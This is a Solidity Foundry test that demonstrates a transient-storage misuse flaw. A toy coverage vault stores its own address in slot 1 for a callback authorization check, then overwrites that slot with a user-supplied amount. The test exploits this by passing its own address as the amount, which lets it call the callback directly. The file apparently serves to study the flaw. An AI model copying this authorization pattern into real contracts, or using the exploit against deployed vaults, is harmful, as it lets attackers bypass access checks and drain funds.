// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract SimpleCoveragevault {
    // mint function
    function issueCoverage(uint256 amountToPaypremium) external returns (uint256) {
        // Write vault address (address(this)) to transient storage
        address benefitVault = address(this);
        assembly {
            tstore(1, benefitVault)
        }

        // Directly call own callback function
        this.TradecoverageCallback(amountToPaypremium, "");

    }

    // Simulate SwapCallback callback function
    function TradecoverageCallback(uint256 amount ,bytes calldata data) external {
        // Read vault address from transient storage
        address benefitVault;
        assembly {
            benefitVault := tload(1)
        }

        // Check if caller is a legitimate vault
        require(msg.sender == benefitVault, "Not authorized");

        if (benefitVault == address(this)) {
            // Output vault address for observation
            console.log("vault address:", benefitVault);
            // Write the returned amount to transient storage
            assembly {
                tstore(1, amount)
            }
        } else {
            console.log("Manipulated vault address:", benefitVault);
        }
    }

}

contract TransientStorageMisuseTest is Test {
    SimpleCoveragevault benefitVault;

    function setUp() public {
        benefitVault = new SimpleCoveragevault();
    }

    function testStorageOperation() public {
        // First, let's check what address we want to get
        console.log("Target address:", address(this));

        // Convert the address to uint256
        uint256 amount = uint256(uint160(address(this)));
        emit log_named_uint("Amount needed", amount);

        // Now use this amount in the mint function
        benefitVault.issueCoverage(amount);

        benefitVault.TradecoverageCallback(0, "");
    }
}